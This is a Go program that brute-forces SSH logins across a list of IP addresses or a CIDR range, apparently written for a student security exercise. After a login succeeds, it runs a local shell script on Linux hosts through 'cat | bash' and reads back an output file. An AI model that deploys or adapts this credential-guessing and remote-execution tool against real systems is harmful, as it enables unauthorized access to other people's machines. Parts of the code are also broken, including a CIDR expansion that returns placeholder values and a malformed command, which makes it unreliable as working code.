package main

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"time"

	"golang.org/x/crypto/ssh"
)

var validUser string
var validPass string

var userList, passList []string

var verbose bool

func check(e error) {
	// Kills program if error
	if e != nil {
		log.Fatal(e)
	}
}

func readFile(filename string) string {
	// Reads file into a string
	fileBytes, err := ioutil.ReadFile(filename)
	check(err)
	fileString := string(fileBytes)
	return fileString
}

func readLines(path string) ([]string, error) {
	// reads every line of a file into a list
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}

	defer file.Close()
	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}

	return lines, scanner.Err()
}

func sshDialer(user string, pass string, rhost string, timeoutPtr *int) bool {
	// Attempts to make a SSH connection and returns whether that connectino was sucessful or not
	config := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(pass),
		},
		Timeout:         time.Duration(*timeoutPtr) * time.Millisecond,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	_, err := ssh.Dial("tcp", rhost+":22", config)
	if err != nil {
		return false
	}
	return true
}

// change list param to pointer
func findUser(userList []string, passList []string, rhost string, timeoutPtr *int) (string, string) {
	// function to find a valid login for a remote host over SSH
	for _, i := range userList {
		for _, j := range passList {
			fmt.Printf("%s:%s\n", i, j)
			if sshDialer(i, j, rhost, timeoutPtr) {
				fmt.Printf("Correct combination!\n")
				return i, j
			}
		}
	}
	return "", ""
}

func sendCMD(rhost, cmd string) (string, error) {
	// send a command to the remote host over SSH
	config := &ssh.ClientConfig{
		User: validUser,
		Auth: []ssh.AuthMethod{
			ssh.Password(validPass),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	client, err := ssh.Dial("tcp", rhost+":22", config)
	if err != nil {
		return "", err
	}
	session, err := client.NewSession()
	if err != nil {
		return "", err
	}
	defer session.Close()
	var b bytes.Buffer
	session.Stdout = &b
	err = session.Run(cmd)
	return b.String(), err
}

func expandCIDR(network string) []string {
	// expands a CIDR notated IP into a list of all the possible IP addresses it could be
	_, ipv4Net, err := net.ParseCIDR(network)
	check(err)

	mask := binary.BigEndian.Uint32(ipv4Net.Mask)
	start := binary.BigEndian.Uint32(ipv4Net.IP)

	finish := (start & mask) | (mask ^ 0xffffffff)

	for i := start; i > finish; i++ {
		ip := make(net.IP, 4)
		binary.BigEndian.PutUint32(ip, i)
		fmt.Println(i)
	}

	return []string{"a", "b"}
}

func main() {
	// define the possible flags
	ipFilePtr := flag.String("ip", "IP.txt", "This is the file that lists the IP addresses to scan")
	userFilePtr := flag.String("u", "", "This is the file that holds the usernames to try")
	passFilePtr := flag.String("p", "", "This is the file that holds the passwords to try")
	timeoutPtr := flag.Int("t", 50, "This is the timeout for the SSH connection (Going too low will cause everyting to fail)")
	rnetPointer := flag.String("n", "", "Network to try in CIDR notation")
	flag.Parse()

	var ipList []string

	if *rnetPointer != "" {
		ipListTmp := expandCIDR(*rnetPointer)
		ipList = ipListTmp

	} else {
		ipListTmp, err := readLines(*ipFilePtr)
		check(err)
		ipList = ipListTmp

	}

	for _, host := range ipList {

		fmt.Printf("Now working on: %s\n", host)

		if *userFilePtr == "" {
			userList = []string{"one", "cyberstudent", "three"}
		} else {
			userListTmp, err := readLines(*userFilePtr)
			check(err)
			userList = append(userList, userListTmp...)
		}
		if *passFilePtr == "" {
			passList = []string{"a", "teach a man to phish", "f"}
		} else {
			passListTmp, err := readLines(*passFilePtr)
			check(err)
			passList = append(passList, passListTmp...)
		}
		validUser, validPass = findUser(userList, passList, host, timeoutPtr)

		if validUser == "" || validPass == "" {
			fmt.Println("Failed to find valid creds :(")
		}

		var operatingSystem string
		// detect the os
		_, linuxErr := sendCMD(host, "uname")
		_, winErr := sendCMD(host, "cmd /c ver")

		if linuxErr == nil {
			operatingSystem = "Linux"
		} else if winErr == nil {
			operatingSystem = "Windows"
		} else {
			fmt.Println("No clue what this is bud. Sorry to say")
		}

		// send the script
		if operatingSystem == "Linux" {
			script := readFile("test.sh")
			out, err := sendCMD(host, "cat "+script+"| bash")
			fmt.Println(out)
			fmt.Println(err)
		}
		out, _ := sendCMD(host, "cat outfile")
		fmt.Println(out)
	}
}
